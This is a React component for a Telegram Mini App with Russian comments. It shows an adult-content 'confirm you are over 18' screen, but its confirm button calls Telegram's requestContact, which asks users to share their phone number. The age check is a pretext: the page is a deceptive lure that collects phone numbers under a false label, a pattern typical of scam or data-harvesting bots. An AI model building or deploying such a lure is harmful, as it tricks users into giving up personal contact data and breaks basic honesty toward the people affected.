import { useEffect, useState } from 'react';
import Sex from "../assets/sex.svg";

// Объявляем типы глобально, чтобы TypeScript не ругался на window.Telegram
declare global {
  interface Window {
    Telegram: any;
  }
}

export const Page = () => {
  // Используем useState для хранения объекта WebApp
  const [tg, setTg] = useState<any>(null);

  useEffect(() => {
    // Ключевая проверка, которая предотвращает сбой вне Telegram-клиента.
    // Если WebApp API не загружено, tg останется null, и кнопка будет disabled.
    if (window.Telegram && window.Telegram.WebApp) {
      const webApp = window.Telegram.WebApp;
      webApp.ready(); // Сообщаем Телеграму, что приложение готово
      setTg(webApp);
    }
  }, []);

  const requestContact = () => {
    // Если tg еще не загрузился (внешнее окружение), выходим
    if (!tg) return;

    tg.requestContact((shared: boolean) => {
      console.log("Статус шеринга контакта:", shared);

      if (shared) {
        console.log("Контакт успешно получен!");
      } else {
        console.log("Пользователь отказался");
      }
    });
  };

  return (
    <div className="w-screen h-screen relative overflow-hidden">
      <img 
        src="./src/assets/jopa.png"
        className="absolute inset-0 w-full h-full object-fill"
        alt=""
      />

      <div className="absolute inset-0 backdrop-blur-sm bg-white/10"></div>

      <div className="relative z-10 flex flex-col items-center place-content-center gap-6 px-10 h-full">
        <img src={Sex} alt="" className='size-[50%] max-w-52 h-fit'/>

        <div className='bg-white p-4 rounded-xl text-center shadow-[0_0_20px_rgba(0,0,0,0.4)] w-full'>
          <span className='font-semibold'>Attention! 🔞 To continue, you must confirm that you are over 18 😊</span>
        </div>

        <button 
          className='bg-[#40a7e2] p-4 rounded-xl text-center shadow-[0_0_20px_rgba(0,0,0,0.4)] w-full'
          onClick={requestContact}
          // Кнопка отключена, пока tg (Telegram API) не инициализирован
          disabled={!tg}
          style={{ opacity: tg ? 1 : 0.5 }}
        >
          <span className='font-semibold text-white'>
             {tg ? '🍓 confirm 🔞' : 'Loading API...'}
          </span>
        </button>
      </div>
    </div>
  );
};